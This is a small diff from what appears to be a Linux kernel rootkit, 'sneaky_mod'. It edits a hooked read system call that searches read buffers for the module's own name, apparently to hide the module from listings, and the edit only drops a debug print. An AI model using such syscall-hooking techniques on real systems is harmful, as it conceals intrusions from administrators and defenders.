@@ -102,8 +102,7 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
     if (nread == 0) {
         return 0;
     }
-    find = strnstr(buf, "sneaky_mod", strlen("sneaky_mod"));
-    printk(KERN_INFO"strlen(\"sneaky_mod\"): %zu \n", strlen("sneaky_mod"));
+    find = strnstr(buf, "sneaky_mod", strlen("sneaky_mod")); //10
     if (find != NULL) {
         printk(KERN_INFO"find sneaky_mod: %s \n", find);
         end = strnstr(find, "\n", strlen("\n"));
